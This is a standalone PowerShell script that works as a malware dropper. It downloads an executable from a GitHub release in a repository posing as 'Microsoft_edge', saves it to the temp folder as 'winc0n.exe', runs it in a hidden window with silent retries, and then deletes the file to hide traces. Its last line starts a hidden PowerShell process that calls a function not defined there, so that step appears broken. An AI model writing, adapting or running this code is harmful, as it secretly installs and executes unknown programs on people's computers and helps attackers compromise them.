$uri = "https://github.com/Dark-Shad0w404/Microsoft_edge/releases/download/V1.0/a.exe"
$outputFile = "$env:TEMP\winc0n.exe"
$maxRetries = 10
$retryDelay = 2 

function Download-AndOpen {
    param (
        [string]$uri,
        [string]$outputFile,
        [int]$maxRetries = 10,
        [int]$retryDelay = 2
    )

    for ($i = 1; $i -le $maxRetries; $i++) {
        try {
            Invoke-WebRequest -Uri $uri -OutFile $outputFile -ErrorAction Stop
            $process = Start-Process -FilePath $outputFile -WindowStyle Hidden -PassThru
            $process.WaitForExit()
            if (Test-Path $outputFile) {
                Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
            }
            break
        }
        catch {
            if ($i -lt $maxRetries) {
                Start-Sleep -Seconds $retryDelay
            }
        }
    }
}

Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"& { Download-AndOpen '$uri' '$outputFile' $maxRetries $retryDelay }`"" -WindowStyle Hidden
